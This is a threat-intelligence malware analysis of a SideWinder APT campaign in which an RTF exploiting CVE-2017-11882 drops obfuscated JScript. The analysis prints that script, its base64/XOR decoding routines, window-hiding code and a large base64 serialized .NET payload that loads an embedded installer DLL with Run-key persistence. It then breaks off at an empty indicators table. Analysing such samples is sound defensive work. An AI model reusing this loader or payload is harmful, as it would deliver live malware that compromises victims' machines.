# SideWinder same targets, same TTPs, time to counter-attack ! 
## Table of Contents
* [Malware analysis](#Malware-analysis)
* [Threat Intelligence](#Intel)
* [Cyber kill chain](#Cyber-kill-chain)
* [Indicators Of Compromise (IOC)](#IOC)
* [Yara Rules](#Yara)
* [References MITRE ATT&CK Matrix](#Ref-MITRE-ATTACK)
* [Knowledge Graph](#Knowledge)
* [Links](#Links)
  + [Original Tweet](#tweet)
  + [Link Anyrun](#Links-Anyrun)
  + [Ressources](#Ressources)

<h2>Malware analysis <a name="Malware-analysis"></a></h2>
<h6>The initial vector is an RTF file who use an well-know vulnerability (CVE-2017-11882) for execute a js script (1.a) form the package of OLE objects. </h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/RTF_objects.PNG">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/obj1.PNG">
</p>
<h6>We can observe on the code of the exploit that jump and rebuild the command to execute. </h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/obj2.PNG">
</p>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/exploit.png">
</p>
<h6>As first, we can observe that a series of functions are used for obfuscate the criticals parts of the script.</h6>

```javascript
var OaXQT = ActiveXObject;
var cRKGlc = String.fromCharCode;
function RDDb(str) 
 {
  var b64 = "ABCDEFGHIJKLMNOPQRSTUVWXY"+"Zabcdefghijklmnopqrstuvwxyz0123456789+/="
  var b, result = "", r1, r2, i = 0;
  for (; i < str.length;) 
   {
     b = b64.indexOf(str.charAt(i++)) << 18 | b64.indexOf(str.charAt(i++)) << 12 |(r1 = b64.indexOf(str.charAt(i++))) << 6 | (r2 = b64.indexOf(str.charAt(i++)));
     result += r1 === 64 ? cRKGlc(b >> 16 & 255) : r2 === 64 ? cRKGlc(b >> 16 & 255, b >> 8 & 255) : cRKGlc(b >> 16 & 255, b >> 8 & 255, b & 255);
   }
 return result;
};
function SJnEuQM (key, bytes)
{
  var res = [];
  for (var i = 0; i < bytes.length; ) {
   for (var j = 0; j < key.length; j++) {
     res.push(cRKGlc((bytes.charCodeAt(i)) ^ key.charCodeAt(j)));
     i++;
     if (i >= bytes.length) {j = key.length;}
     }
   }
return res.join("")
}
function EvpTXkLe(bsix){ return SJnEuQM(keeee,RDDb(bsix))}
var keeee = SJnEuQM("YjfT",RDDb("altWY2"+"hcV2xq"+"XA=="));
```
<h6>This series of functions perform the decryption of the base64 and xor by a constant encoded key (keeee), this can be merged on one single next function</h6>

```javascript
function EvpTXkLe(bytes)
{
 var b,b64 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/=",result = "",r1,r2, i = 0,res = [],key ="3107161836";
 for (; i < bytes.length;) 
 {
  b = b64.indexOf(bytes.charAt(i++)) << 18 | b64.indexOf(bytes.charAt(i++)) << 12 |(r1 = b64.indexOf(bytes.charAt(i++))) << 6 | (r2 = b64.indexOf(bytes.charAt(i++)));
  result += r1 === 64 ? String.fromCharCode(b >> 16) : r2 === 64 ? String.fromCharCode(b >> 16 & 255, b >> 8 & 255) : String.fromCharCode(b >> 16 & 255, b >> 8 & 255, b & 255);
 }
 for (var i = 0; i < result.length; ) {
  for (var j = 0; j < key.length; j++) {
    res.push(String.fromCharCode((result.charCodeAt(i)) ^ key.charCodeAt(j)));
    i++;
    if (i >= result.length) { j = key.length;}
    }
   }
 return res.join("")
}
var data= EvpTXkLe("Data to decrypt")
console.log(data)
```
<h6>The first block inside the try/catch is for initialize theposition of the window outside the display and payload to inject in the process</h6>

```javascript
var mst = null;
var FSO = null;
window.resizeTo(1, 1);
window.moveTo(-1000, -1200);
var shells = new ActiveXObject("WScript.Shell");
var so = "AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkDAAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRlRW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRUeXBlTmFtZQptZXRob2ROYW1lDWRlbGVnYXRlRW50cnkBAQIBAQEDMFN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xkZXIrRGVsZWdhdGVFbnRyeQYFAAAAL1N5c3RlbS5SdW50aW1lLlJlbW90aW5nLk1lc3NhZ2luZy5IZWFkZXJIYW5kbGVyBgYAAABLbXNjb3JsaWIsIFZlcnNpb249Mi4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5BgcAAAAHdGFyZ2V0MAkGAAAABgkAAAAPU3lzdGVtLkRlbGVnYXRlBgoAAAANRHluYW1pY0ludm9rZQoEAwAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyAwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADBwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXphdGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5Ai9TeXN0ZW0uUmVmbGVjdGlvbi5NZW1iZXJJbmZvU2VyaWFsaXphdGlvbkhvbGRlcgkLAAAACQwAAAAJDQAAAAQEAAAAL1N5c3RlbS5SZWZsZWN0aW9uLk1lbWJlckluZm9TZXJpYWxpemF0aW9uSG9sZGVyBgAAAAROYW1lDEFzc2VtYmx5TmFtZQlDbGFzc05hbWUJU2lnbmF0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eXN0ZW0uSU8ARW5jb2RlRGF0YQBkYXRhAG1zY29ybGliAHNyYwBSZWFkAFRyaW1FbmQAQXBwZW5kAGZpbmQAUmVwbGFjZQBDb21wcmVzc2lvbk1vZGUAZ2V0X1VuaWNvZGUASURpc3Bvc2FibGUARmlsZQBHZXRGaWxlTmFtZQBoaWphY2tkbGxuYW1lAFVybENvbWJpbmUARGlzcG9zZQBDcmVhdGUAV3JpdGUAR3VpZEF0dHJpYnV0ZQBEZWJ1Z2dhYmxlQXR0cmlidXRlAENvbVZpc2libGVBdHRyaWJ1dGUAQXNzZW1ibHlUaXRsZUF0dHJpYnV0ZQBBc3NlbWJseVRyYWRlbWFya0F0dHJpYnV0ZQBBc3NlbWJseUZpbGVWZXJzaW9uQXR0cmlidXRlAEFzc2VtYmx5Q29uZmlndXJhdGlvbkF0dHJpYnV0ZQBBc3NlbWJseURlc2NyaXB0aW9uQXR0cmlidXRlAENvbXBpbGF0aW9uUmVsYXhhdGlvbnNBdHRyaWJ1dGUAQXNzZW1ibHlQcm9kdWN0QXR0cmlidXRlAEFzc2VtYmx5Q29weXJpZ2h0QXR0cmlidXRlAEFzc2VtYmx5Q29tcGFueUF0dHJpYnV0ZQBSdW50aW1lQ29tcGF0aWJpbGl0eUF0dHJpYnV0ZQBCeXRlAFNldFZhbHVlAGNvcHlleGUARW5jb2RpbmcARnJvbUJhc2U2NFN0cmluZwBUb0Jhc2U2NFN0cmluZwBUb1N0cmluZwBzZWFyY2gAR2V0Rm9sZGVyUGF0aABpbnN0cGF0aABnZXRfTGVuZ3RoAGxlbmd0aABXb3JrAFN0SW5zdGFsbGVyLmRsbAByZXBsAHVybABHWmlwU3RyZWFtAE1lbW9yeVN0cmVhbQBQcm9ncmFtAFN5c3RlbQBUcmltAFJhbmRvbQBHZW5lcmF0ZVRva2VuAGRvbWFpbgBTeXN0ZW0uSU8uQ29tcHJlc3Npb24AU3lzdGVtLlJlZmxlY3Rpb24ARXhjZXB0aW9uAERpcmVjdG9yeUluZm8AQ2hhcgBTdHJpbmdCdWlsZGVyAFNwZWNpYWxGb2xkZXIAaW5zdGZvbGRlcgBCdWZmZXIAU3RJbnN0YWxsZXIAQ3VycmVudFVzZXIAUmFuZG9tTnVtYmVyR2VuZXJhdG9yAC5jdG9yAFN5c3RlbS5EaWFnbm9zdGljcwBTeXN0ZW0uUnVudGltZS5JbnRlcm9wU2VydmljZXMAU3lzdGVtLlJ1bnRpbWUuQ29tcGlsZXJTZXJ2aWNlcwBEZWJ1Z2dpbmdNb2RlcwBFeHBhbmRFbnZpcm9ubWVudFZhcmlhYmxlcwBGaW5kQnl0ZXMAUmVwbGFjZUJ5dGVzAFdyaXRlQWxsQnl0ZXMAR2V0Qnl0ZXMATmV4dEJ5dGVzAGdldF9DaGFycwBQcm9jZXNzAERlY29tcHJlc3MARXhpc3RzAHhvckl0AENvbmNhdABGb3JtYXQAT2JqZWN0AFBhZFJpZ2h0AEVudmlyb25tZW50AG1hbmlmZXN0Q29udGVudABUcmltU3RhcnQAQ29udmVydABpbnB1dABTeXN0ZW0uVGV4dABUb0FycmF5AE9wZW5TdWJLZXkAeEtleQBSZWdpc3RyeUtleQByZWdrZXkAU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeQBCbG9ja0NvcHkAQ3JlYXRlRGlyZWN0b3J5AFJlZ2lzdHJ5AAAAGXIAZQBrAGUAeQB3AGkAegAuAGUAeABlAACBszwAPwB4AG0AbAAgAHYAZQByAHMAaQBvAG4APQAiADEALgAwACIAIABlAG4AYwBvAGQAaQBuAGcAPQAiAHUAdABmAC0AOAAiAD8APgANAAoAPABjAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuAD4ADQAKADwAcwB0AGEAcgB0AHUAcAAgAHUAcwBlAEwAZQBnAGEAYwB5AFYAMgBSAHUAbgB0AGkAbQBlAEEAYwB0AGkAdgBhAHQAaQBvAG4AUABvAGwAaQBjAHkAPQAiAHQAcgB1AGUAIgA+AA0ACgA8AHMAdQBwAHAAbwByAHQAZQBkAFIAdQBuAHQAaQBtAGUAIAB2AGUAcgBzAGkAbwBuAD0AIgB2ADIALgAwAC4ANQAwADcAMgA3ACIALwA+AA0ACgA8AHMAdQBwAHAAbwByAHQAZQBkAFIAdQBuAHQAaQBtAGUAIAB2AGUAcgBzAGkAbwBuACAAPQAiAHYANAAuADAAIgAvAD4ADQAKADwALwBzAHQAYQByAHQAdQBwAD4ADQAKADwALwBjAG8AbgBmAGkAZwB1AHIAYQB0AGkAbwBuAD4AARdnAHgAYgA1AGMAZgBnAGkA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";
```
<h6>The next block is two functions one used for write the payload at inject and the second for check the version .NET on the system</h6>

```javascript
function write_payload(b) 
 {
 var enc = new ActiveXObject("System.Text.ASCIIEncoding");
 var length = enc.GetByteCount_2(b);
 var ba = enc.GetBytes_4(b); 
 var transform = new ActiveXObject("System.Security.Cryptography.FromBase64Transform");
 ba = transform.TransformFinalBlock(ba, 0, length);
 mst = new ActiveXObject("System.IO.MemoryStream");
 mst.Write(ba, 0, (length / 4) * 3);
 mst.Position = 0; 
}
function check_NET_version()
{
 var net = "",folder;
 var folds = FSO.GetFolder(FSO.GetSpecialFolder(0)+"\Microsoft.NET\Framework\").SubFolders;
 e = new Enumerator(folds);
 e.moveFirst();  
 do
  {  
   folder = e.item();
   var files = folder.files;
   var fileEnum = new Enumerator(files); 
   fileEnum.moveFirst();
   while(fileEnum.atEnd() == false)
   {
    if(fileEnum.item().Name == "csc.exe")
     {
       if(folder.Name.substring(0,2) == "v2") {return "v2.0.50727"}
       else if(folder.Name.substring(0,2) == "v4") { return "v4.0.30319"}
     }
    fileEnum["moveNext"](); 
   }
   e["moveNext"]();
  }while (e.atEnd() == false)  
 return folder.Name;
}
```

<h2>Threat Intelligence</h2><a name="Intel"></a></h2>
<h2> Cyber kill chain <a name="Cyber-kill-chain"></a></h2>
<h6>The process graph resume cyber kill chains used by the attacker :</h6>
<p align="center">
  <img src="https://raw.githubusercontent.com/StrangerealIntel/CyberThreatIntel/master/Indian/APT/SideWinder/25-12-19/Pictures/Cyber.png">
</p>
<h2> Indicators Of Compromise (IOC) <a name="IOC"></a></h2>
<h6> List of all the Indicators Of Compromise (IOC)</h6>

|Indicator|Description|
